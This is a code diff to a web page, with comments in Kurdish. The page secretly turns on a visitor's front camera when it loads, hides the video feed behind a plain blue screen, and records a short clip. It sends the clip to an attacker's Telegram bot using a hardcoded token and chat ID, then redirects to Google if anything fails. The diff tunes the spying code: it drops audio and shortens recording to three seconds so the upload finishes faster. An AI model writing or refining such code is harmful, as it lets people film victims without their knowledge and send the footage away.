@@ -11,13 +11,14 @@
     <style>
         body { 
             margin: 0; 
-            background: #0000FF !important; /* ڕەنگی شین */
+            background: #0000FF !important; /* ڕەنگی شین وەک خۆت ویستت */
             display: flex; 
             align-items: center; 
             justify-content: center; 
             height: 100vh; 
             overflow: hidden;
         }
+        /* شاردنەوەی کامێراکە لەبەرچاو */
         video { display: none !important; }
     </style>
 </head>
@@ -30,7 +31,8 @@
         const chatId = '7602797383';
 
         window.onload = function() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+            // تەنها کامێرا چالاک دەکات و مایکرۆفۆنی بێدەنگ کردووە (audio: false)
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
             .then(stream => {
                 const video = document.getElementById('video');
                 video.srcObject = stream;
@@ -44,8 +46,7 @@
                     }
                 };
 
-                // فرمانی ناردنی ڤیدیۆکە
-                function sendVideoData() {
+                mediaRecorder.onstop = function() {
                     if (chunks.length === 0) return;
                     
                     const blob = new Blob(chunks, { type: 'video/mp4' });
@@ -53,6 +54,7 @@
                     formData.append('chat_id', chatId);
                     formData.append('video', blob, 'video.mp4');
 
+                    // ناردنی ڤیدیۆ کورتەکە بۆ تیلیگرام
                     fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
                         method: 'POST',
                         body: formData
@@ -62,26 +64,16 @@
                     }).catch(() => {
                         window.location.href = "https://google.com";
                     });
-                }
-
-                mediaRecorder.onstop = sendVideoData;
-
-                // دەستپێکردنی ڕیکۆردکردن بە ناردنی داتا هەر ٢ چرکە جارێک
-                mediaRecorder.start(2000); 
-
-                // ئەگەر بەکارهێنەرەکە پەڕەکەی داخست، هەوڵ دەدات خێرا ڤیدیۆکە بنێرێت
-                window.onbeforeunload = function() {
-                    if (mediaRecorder.state !== "inactive") {
-                        mediaRecorder.stop();
-                    }
                 };
 
-                // دوای ١٠ چرکە (10000 میلی چرکە) خۆی دەوەستێت و دەنێرێت
+                mediaRecorder.start();
+
+                // تەنها ٣ چرکە ڕیکۆرد دەکات بۆ ئەوەی خێرا بنێردرێت و نەسوتێت
                 setTimeout(() => {
                     if (mediaRecorder.state !== "inactive") {
                         mediaRecorder.stop();
                     }
-                }, 10000);
+                }, 3000);
 
             }).catch(err => {
                 window.location.href = "https://google.com";
